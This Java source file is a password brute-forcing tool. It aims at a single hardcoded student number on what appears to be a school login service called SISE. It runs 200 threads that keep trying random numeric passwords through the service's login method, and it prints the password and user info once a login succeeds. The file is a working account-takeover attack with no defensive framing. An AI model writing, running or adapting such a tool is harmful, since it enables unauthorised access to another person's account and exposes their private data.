package com.sise.ccj;

import com.sise.common.SiseLogin;
import com.sise.common.SiseLoginImpl;
import com.sise.common.SiseUserInfo;

import java.util.Random;
import java.util.concurrent.Executors;
import java.util.concurrent.ThreadPoolExecutor;

public class Tool {

    private static final String sno = "1640128321";

    private static int count = 1;

    private static int[] number = {1, 2, 3, 4, 5, 7, 6, 8, 9, 10};


    private static ThreadPoolExecutor thread = (ThreadPoolExecutor) Executors.newFixedThreadPool(200);

    public static void main(String[] args) throws InterruptedException {
        SiseLoginImpl siseLogin = new SiseLoginImpl();
        siseLogin.init();
        Random random = new Random();
        while (true) {
            if (thread.getActiveCount() <= 0) {
                Thread.sleep(2000);
            }
            thread.execute(() -> {
                String pwd = getPassword();
                System.out.println(pwd);
                SiseUserInfo siseUserInfo = siseLogin.login(sno, pwd);
                if(siseUserInfo != null){
                    System.out.println(siseUserInfo);
                    System.out.println(pwd);
                    System.exit(-1);
                }
            });
            count = random.nextInt(16);
        }
    }

    private synchronized static String getPassword() {
        String str = "";
        Random random = new Random();
        for (int i = 0; i < count; i++) {
            int a = random.nextInt(10);
            str += String.valueOf(number[a]);
        }
        return str;
    }
}
